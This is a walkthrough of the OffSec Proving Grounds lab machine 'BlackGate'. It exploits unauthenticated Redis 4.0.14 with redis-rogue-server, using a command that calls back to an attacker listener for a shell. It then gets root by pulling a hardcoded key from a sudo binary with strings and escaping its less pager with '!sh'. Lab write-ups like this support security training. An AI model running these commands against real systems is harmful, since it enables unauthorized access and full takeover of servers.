# BlackGate — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Intermediate
**OS:** Linux

---

## TL;DR

Redis 4.0.14 (unauthenticated) → redis-rogue-server RCE → shell as `prudence` → sudo `redis-status` binary spawns `less` pager → GTFOBins `less` escape → root.

---

## Enumeration

Full nmap scan:

```bash
sudo nmap -sS -p- -n -Pn -sV --min-rate=9362 192.168.249.176
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.3p1 Ubuntu |
| 6379 | Redis | Redis 4.0.14 |

Just SSH and **Redis**. Let's dig deeper into Redis with the nmap script:

```bash
nmap --script redis-info -sV -p 6379 192.168.249.176
```

```
Version: 4.0.14
Operating System: Linux 5.8.0-63-generic x86_64
Architecture: 64 bits
Role: master
Bind addresses: 0.0.0.0
```

Redis 4.0.14, binding on all interfaces, and no authentication. That's a recipe for trouble.

---

## Exploitation — Redis Rogue Server RCE

Redis 4.x without authentication is vulnerable to the **redis-rogue-server** attack. This technique exploits the master-slave replication feature to load a malicious module and execute arbitrary commands.

- **Tool:** [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
- **Reference:** [HackTricks — Pentesting Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)

```bash
python3 redis-rogue-server.py --rhost=192.168.245.176 --rport=6379 --lhost=192.168.45.239 --lport=4446
```

We get a shell as user `prudence`.

---

## Privilege Escalation — Less Pager Escape

Let's check sudo permissions:

```bash
sudo -l
```

```
User prudence may run the following commands on blackgate:
    (root) NOPASSWD: /usr/local/bin/redis-status
```

Running the binary:

```bash
/usr/local/bin/redis-status
```

```
[*] Redis Uptime
Authorization Key:
Wrong Authorization Key!
Incident has been reported!
```

It wants an authorization key. Let's reverse engineer it the quick way — `strings`:

```bash
strings /usr/local/bin/redis-status
```

Among the noise, we spot the key:

```
ClimbingParrotKickingDonkey321
```

Now let's run it with sudo and the correct key:

```bash
sudo redis-status
```

```
[*] Redis Uptime
Authorization Key: ClimbingParrotKickingDonkey321
```

It displays the systemctl status output using a **pager** (which is `less`). And here's where the magic happens — when `less` is running as root (via sudo), we can escape to a root shell.

From [GTFOBins — less](https://gtfobins.github.io/gtfobins/less/):

While inside the `less` pager, just type:

```
!sh
```

This spawns a shell — and since `less` was running as root through sudo, we get a **root shell**. 🎉

---

## Key Takeaways

- **Unauthenticated Redis** is extremely dangerous — the rogue server attack can give you RCE through the replication feature
- **`strings`** is a quick and dirty way to extract hardcoded secrets from binaries — don't overlook it
- **Pager escapes** (especially `less`) are a classic priv esc technique — whenever a SUID or sudo binary opens a pager, check GTFOBins for escape methods
- This box chains two very different techniques: a network service exploit and a local binary abuse

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
